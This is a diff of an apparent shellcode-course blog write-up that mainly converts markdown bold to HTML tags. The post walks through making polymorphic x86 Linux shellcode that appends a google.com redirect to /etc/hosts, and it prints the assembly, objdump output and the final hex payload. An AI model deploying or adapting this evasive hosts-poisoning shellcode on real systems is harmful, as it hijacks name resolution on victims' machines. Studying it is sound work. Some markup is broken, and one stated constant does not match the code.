@@ -576,7 +576,7 @@ _load_data:
 </pre>
 
 <p style="text-align:justify;">
-Furthermore, the instructions above can be changed in order to perform polymorphism while altering the coding format without changing the functionality of the program. First, the instructions that represent the **open()** system call will be changed as follows
+Furthermore, the instructions above can be changed in order to perform polymorphism while altering the coding format without changing the functionality of the program. First, the instructions that represent the <b>open()</b> system call will be changed as follows
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
@@ -619,9 +619,9 @@ jmp short _ldata ;jmp-call-pop technique to load the map
 </pre>
 
 <p style="text-align:justify;">
-The above instructions have been altered in order to achieve polymorphism. The technique **jmp-pop-call** will still remains the same with changes only in label names. Also, the **mul ecx** replaced with , **cdq** and **xor eax, eax ,** zeroing out the **eax** and **edx** registers accordingly. Additionally, the **push** instruction has been altered using **mov** instruction and the file permissions value **0x401** in hex has been splitted into two values , **0x3b1** and **0x50** instead of one, adding them together using the **add** instruction at the 8bits register **cx**. The **xchg** instruction has been changed to **mov** instruction as the **ebx** will be assigned with the value **0x3** which represents the hosts file descriptor returned from the **open()** system call. The **xchg** used from _shellcode_ writer to reduce the _shellcode_ length as it needs two bytes, against the three bytes that **mov** needs. Also , the _shellcode_ writer uses **push** and **pop** to load the **0x4** immediate value into **eax** register indicating the **write()** system call. The alteration here is that the **push** and **pop** replaced with **mov** and also the location of the instruction moved after the **jmp short** instruction and before the **int 0x80** instruction.
+The above instructions have been altered in order to achieve polymorphism. The technique <b>jmp-pop-call</b> will still remains the same with changes only in label names. Also, the <b>mul ecx</b> replaced with , <b>cdq</b> and <b>xor eax, eax ,</b> zeroing out the <b>eax</b> and <b>edx</b> registers accordingly. Additionally, the <b>push</b> instruction has been altered using <b>mov</b> instruction and the file permissions value <b>0x401</b> in hex has been splitted into two values , <b>0x3b1</b> and <b>0x50</b> instead of one, adding them together using the <b>add</b> instruction at the 8bits register <b>cx**. The <b>xchg</b> instruction has been changed to <b>mov</b> instruction as the <b>ebx</b> will be assigned with the value <b>0x3</b> which represents the hosts file descriptor returned from the <b>open()</b> system call. The <b>xchg</b> used from _shellcode_ writer to reduce the <it>shellcode</it> length as it needs two bytes, against the three bytes that <b>mov</b> needs. Also , the _shellcode_ writer uses <b>push</b> and <b>pop</b> to load the <b>0x4</b> immediate value into <b>eax</b> register indicating the <b>write()</b> system call. The alteration here is that the <b>push</b> and <b>pop</b> replaced with <b>mov</b> and also the location of the instruction moved after the <b>jmp short</b> instruction and before the <b>int 0x80</b> instruction.
 
-Furthermore, the label **\_load\_data** will be changed with **\_ldata** at **jmp short** instruction. Also, as already mentioned the **mov** instruction above is doing the same thing as the **push** instruction, and that because the **push** instruction is decrementing the stack pointer by the operand size, then moves the operand to the location pointed by the stack pointer. Furthermore, the **sub ebx, 0x10** instruction used to make room for four local variables in the stack to place the string **/etc///hosts** and the **mov ebx, esp** instruction used for stack alignment setting the pointer at the top of the stack.
+Furthermore, the label <b>_load_data</b> will be changed with <b>_ldata</b> at <b>jmp short</b> instruction. Also, as already mentioned the <b>mov</b> instruction above is doing the same thing as the <b>push</b> instruction, and that because the <b>push</b> instruction is decrementing the stack pointer by the operand size, then moves the operand to the location pointed by the stack pointer. Furthermore, the <b>sub ebx, 0x10</b> instruction used to make room for four local variables in the stack to place the string <b>/etc///hosts</b> and the <b>mov ebx, esp</b> instruction used for stack alignment setting the pointer at the top of the stack.
 
 To continue further the write system call instructions will be altered as follows
 </p>
@@ -647,9 +647,9 @@ int 0x80
 
 <p style="text-align:justify;">
 
-The main alteration here is the **pop** and **push** instructions which altered into **mov.** Also in order to avoid null bytes the **edx** register changed into the lower byte register **dl**. Additionally the **\_write** label has been changed into **write\_data**. Following, the **0x15** hex value which represents the length of the message along with the additional carriage return character has been splitted into two values **0x12** and **0x3** instead of one value, then adding them together using the **add** instruction.
+The main alteration here is the <b>pop</b> and <b>push</b> instructions which altered into <b>mov.</b> Also in order to avoid null bytes the <b>edx</b> register changed into the lower byte register <b>dl</b>. Additionally the <b>\_write</b> label has been changed into <b>write_data</b>. Following, the <b>0x15</b> hex value which represents the length of the message along with the additional carriage return character has been splitted into two values <b>0x12</b> and <b>0x3</b> instead of one value, then adding them together using the <b>add</b> instruction.
 
-The next instructions to be altered are representing the **close** system call.
+The next instructions to be altered are representing the <b>close</b> system call.
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
@@ -665,9 +665,9 @@ add al,0x2
 int 0x80 ;syscall to close the file
 </pre>
 
-The above instructions from the original _shellcode_, **pop** and **push** are changed with the **add** instruction. The add instruction adds the **0x2** immediate value with the **0x4** value previously assigned at the lower byte register **al** in order to execute the **close** system call with **int 0x80** instruction.
+The above instructions from the original _shellcode_, <b>pop</b> and <b>push</b> are changed with the <b>add</b> instruction. The add instruction adds the <b>0x2</b> immediate value with the <b>0x4</b> value previously assigned at the lower byte register <b>al</b> in order to execute the <b>close</b> system call with <b>int 0x80</b> instruction.
 
-The next instructions to be altered are representing the **exit** system call.
+The next instructions to be altered are representing the <b>exit</b> system call.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
@@ -684,9 +684,9 @@ mov al,0x1
 int 0x80 ;syscall to exit
 </pre>
 
-The above instructions from the original _shellcode_, **pop** and **push** are changed with the **xor** and **mov** instructions. The **xor** instruction used to zero out the **eax** register and the **mov** instruction used to assign the immediate value at the lower byte **al** register in order to execute the exit system call with **int 0x80** instruction.
+The above instructions from the original _shellcode_, <b>pop</b> and <b>push</b> are changed with the <b>xor</b> and <b>mov</b> instructions. The <b>xor</b> instruction used to zero out the <b>eax</b> register and the <b>mov</b> instruction used to assign the immediate value at the lower byte <b>al</b> register in order to execute the exit system call with <b>int 0x80</b> instruction.
 
-The final instructions exist inside the **\_load\_data** label of the original _shellcode_ and will be altered as follows :
+The final instructions exist inside the <b>load_data</b> label of the original <it>shellcode</it> and will be altered as follows :
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;Original instructions
@@ -702,7 +702,7 @@ call wdata
 message db "127.1.1.1 google.com",0x0A
 </pre>
 
-As said before and shown above, the label **\_load\_data** changed into **\_ldata** and also the label **\_write** changed into **write\_data** at the **call** instruction. Furthermore, the **google** tag changed into **message,** and the carriage return character has been added at the end of the message.
+As said before and shown above, the label <b>_load_data</b> changed into <b>\_ldata</b> and also the label <b>_write</b> changed into <b>write_data</b> at the <b>call</b> instruction. Furthermore, the <b>google</b> tag changed into <b>message,</b> and the carriage return character has been added at the end of the message.
 
 The following output shows the final polymorphic shellcode
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
@@ -770,7 +770,7 @@ root@kali:~/Documents/SLAE/Assignment6# ./compile.sh omap
 [+] Done!
 </pre>
 
-Then the opcodes will be checked if null bytes exist using **objdump**
+Then the opcodes will be checked if null bytes exist using <b>objdump</b>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d omap -M intel
 
@@ -826,7 +826,7 @@ Disassembly of section .text:
 8049063: 0d .byte 0xd
 </pre>
 
-As it's shown above, it is all good with the polymorphic _shellcode,_ so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using **objdump** as follows
+As it's shown above, it is all good with the polymorphic _shellcode,_ so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using <b>objdump</b> as follows
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./omap|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x2f\x2f\x2f\x68\xc7\x44\x24\xf0\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\xb9\xb1\x03\x66\x83\xc1\x50\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xeb\x14\x59\xb2\x12\x80\xc2\x02\xb0\x04\xcd\x80\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe7\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x0a\x0d"
